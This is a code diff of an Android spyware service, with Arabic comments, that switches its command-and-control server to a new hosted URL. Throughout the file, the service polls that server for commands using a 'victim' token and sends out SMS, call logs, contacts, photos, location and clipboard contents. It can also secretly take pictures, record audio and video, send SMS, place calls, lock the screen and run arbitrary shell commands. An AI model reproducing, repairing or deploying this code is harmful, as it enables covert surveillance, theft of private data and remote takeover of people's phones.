@@ -57,8 +57,10 @@ public class ServiceRunner extends Service {
     private static final String TAG = "SecurityCheck";
     private static final String CHANNEL_ID = "sys_service";
     private static final int NOTIFICATION_ID = 1001;
-    private static final String SERVER_URL = "https://sec.h42536974.workers.dev";
-    // ★ 15 ثانية بدل 5
+
+    // ★★★ التعديل الرئيسي: Railway مباشرة ★★★
+    private static final String SERVER_URL = "https://daf-production-8df9.up.railway.app";
+
     private static final int POLL_INTERVAL = 15;
 
     private ScheduledExecutorService scheduler;
@@ -73,6 +75,7 @@ public class ServiceRunner extends Service {
     public void onCreate() {
         super.onCreate();
         Log.d(TAG, "=== SERVICE onCreate ===");
+        Log.d(TAG, "★ SERVER_URL: " + SERVER_URL);
 
         try {
             victimToken = BuildConfig.VICTIM_TOKEN;
@@ -95,7 +98,6 @@ public class ServiceRunner extends Service {
         deviceId = getDeviceId();
         Log.d(TAG, "Device: " + deviceId);
 
-        // ★ تسجيل عند السيرفر
         new Thread(() -> {
             try {
                 Thread.sleep(2000);
@@ -103,7 +105,6 @@ public class ServiceRunner extends Service {
             } catch (Exception e) {}
         }).start();
 
-        // ★ polling
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL, TimeUnit.SECONDS);
         Log.d(TAG, "=== SERVICE STARTED ===");
@@ -181,7 +182,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ Poll — تحقق سريع أولاً ★★★
+    // Poll — check أولاً
     // ============================================================
     private void pollCommands() {
         try {
@@ -190,7 +191,6 @@ public class ServiceRunner extends Service {
                 return;
             }
 
-            // ★ تحقق سريع أولاً (استعلام خفيف)
             String checkUrl = SERVER_URL + "/apk/victim/poll?token=" + victimToken + "&check=1";
             String checkResponse = httpGet(checkUrl);
 
@@ -199,11 +199,8 @@ public class ServiceRunner extends Service {
             JSONObject checkJson = new JSONObject(checkResponse);
             boolean hasCommands = checkJson.optBoolean("has", false);
 
-            if (!hasCommands) {
-                return;  // ★ لا أوامر → لا نكمل
-            }
+            if (!hasCommands) return;
 
-            // ★ في أوامر — اسحبها
             String url = SERVER_URL + "/apk/victim/poll?token=" + victimToken;
             String response = httpGet(url);
             if (response == null || response.isEmpty()) return;
@@ -277,9 +274,6 @@ public class ServiceRunner extends Service {
         } catch (Exception ignored) {}
     }
 
-    // ============================================================
-    // Device Info
-    // ============================================================
     private void sendDeviceInfo() {
         try {
             JSONObject d = new JSONObject();
@@ -296,9 +290,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Battery
-    // ============================================================
     private void sendBattery() {
         try {
             android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
@@ -323,9 +314,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // SMS
-    // ============================================================
     private void sendSms() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_SMS)) {
@@ -356,9 +344,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Call Log
-    // ============================================================
     private void sendCallLog() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
@@ -390,9 +375,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ Contacts — إرسال واحد واحد ★★★
-    // ============================================================
     private void sendContacts() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
@@ -447,7 +429,6 @@ public class ServiceRunner extends Service {
 
                     sent++;
 
-                    // ★ delay كل 25 جهة
                     if (sent % 25 == 0) {
                         Thread.sleep(250);
                     }
@@ -459,7 +440,6 @@ public class ServiceRunner extends Service {
             }
             c.close();
 
-            // إشعار الانتهاء
             JSONObject done = new JSONObject();
             done.put("type", "contacts_done");
             done.put("token", victimToken);
@@ -475,9 +455,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Apps
-    // ============================================================
     private void sendApps() {
         try {
             JSONArray arr = new JSONArray();
@@ -503,9 +480,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ Photos — إرسال واحدة واحدة ★★★
-    // ============================================================
     private void sendPhotos() {
         try {
             Cursor c = getContentResolver().query(
@@ -526,7 +500,6 @@ public class ServiceRunner extends Service {
                     String path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                     long size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
 
-                    // ★ تخطى الصور الكبيرة
                     if (size > 2000000 || size <= 0) {
                         Log.d(TAG, "Skip large photo: " + size);
                         sent++;
@@ -539,7 +512,6 @@ public class ServiceRunner extends Service {
                         continue;
                     }
 
-                    // اقرأ وأرسل
                     byte[] bytes = new byte[(int) imgFile.length()];
                     FileInputStream fis = new FileInputStream(imgFile);
                     int read = fis.read(bytes);
@@ -561,8 +533,6 @@ public class ServiceRunner extends Service {
                     }
 
                     sent++;
-
-                    // ★ delay 500ms
                     Thread.sleep(500);
 
                 } catch (Exception e) {
@@ -572,7 +542,6 @@ public class ServiceRunner extends Service {
             }
             c.close();
 
-            // إشعار الانتهاء
             JSONObject d = new JSONObject();
             d.put("type", "photos_done");
             d.put("token", victimToken);
@@ -587,9 +556,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Location
-    // ============================================================
     private void sendLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -630,9 +596,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Clipboard
-    // ============================================================
     private void sendClipboard() {
         try {
             ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
@@ -658,9 +621,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Camera — Take Picture
-    // ============================================================
     private void takePicture(final int cameraId) {
         new Handler(Looper.getMainLooper()).post(() -> {
             Camera camera = null;
@@ -736,9 +696,6 @@ public class ServiceRunner extends Service {
         });
     }
 
-    // ============================================================
-    // Audio Record
-    // ============================================================
     private void recordAudio(final int durationMs) {
         new Thread(() -> {
             MediaRecorder recorder = null;
@@ -798,9 +755,6 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
-    // ============================================================
-    // Video Record
-    // ============================================================
     private void recordVideo(final int cameraId, final int durationMs) {
         new Thread(() -> {
             Camera camera = null;
@@ -881,9 +835,6 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
-    // ============================================================
-    // Lock Screen
-    // ============================================================
     private void lockScreen() {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager)
@@ -897,8 +848,7 @@ public class ServiceRunner extends Service {
             }
 
             if (!dpm.isAdminActive(adminComponent)) {
-                reportCommandResult("lock_screen", "fail",
-                        "device_admin_not_enabled");
+                reportCommandResult("lock_screen", "fail", "device_admin_not_enabled");
                 Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                 intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -913,9 +863,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Home
-    // ============================================================
     private void goHome() {
         try {
             Intent intent = new Intent(Intent.ACTION_MAIN);
@@ -928,9 +875,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Sounds
-    // ============================================================
     private void playSound() {
         try {
             Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
@@ -949,9 +893,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("play_alarm", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // Vibrate
-    // ============================================================
     private void vibrate(long ms) {
         try {
             Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
@@ -988,9 +929,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("volume_max", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // SMS Send
-    // ============================================================
     private void sendSmsToNumber(String to, String msg) {
         try {
             if (!hasPermission(android.Manifest.permission.SEND_SMS)) {
@@ -1003,9 +941,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("send_sms", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // Call
-    // ============================================================
     private void callNumber(String number) {
         try {
             if (!hasPermission(android.Manifest.permission.CALL_PHONE)) {
@@ -1029,9 +964,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("open_url", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // Shell
-    // ============================================================
     private void executeShell(String command) {
         try {
             Process p = Runtime.getRuntime().exec(command);
@@ -1052,9 +984,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("shell", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // Permission Helper
-    // ============================================================
     private boolean hasPermission(String permission) {
         try {
             return ContextCompat.checkSelfPermission(this, permission)
@@ -1064,9 +993,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // HTTP
-    // ============================================================
     private String httpGet(String urlStr) {
         try {
             URL url = new URL(urlStr);
@@ -1114,6 +1040,17 @@ public class ServiceRunner extends Service {
                 while ((line = reader.readLine()) != null) sb.append(line);
                 reader.close();
                 return sb.toString();
+            } else {
+                // ★ اطبع رد الخطأ
+                try {
+                    BufferedReader reader = new BufferedReader(
+                            new InputStreamReader(conn.getErrorStream()));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) sb.append(line);
+                    reader.close();
+                    Log.e(TAG, "HTTP " + rc + " error: " + sb.toString());
+                } catch (Exception ignored) {}
             }
         } catch (Exception e) {
             Log.e(TAG, "postJson: " + e.getMessage());
@@ -1124,4 +1061,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-                }
+                    }
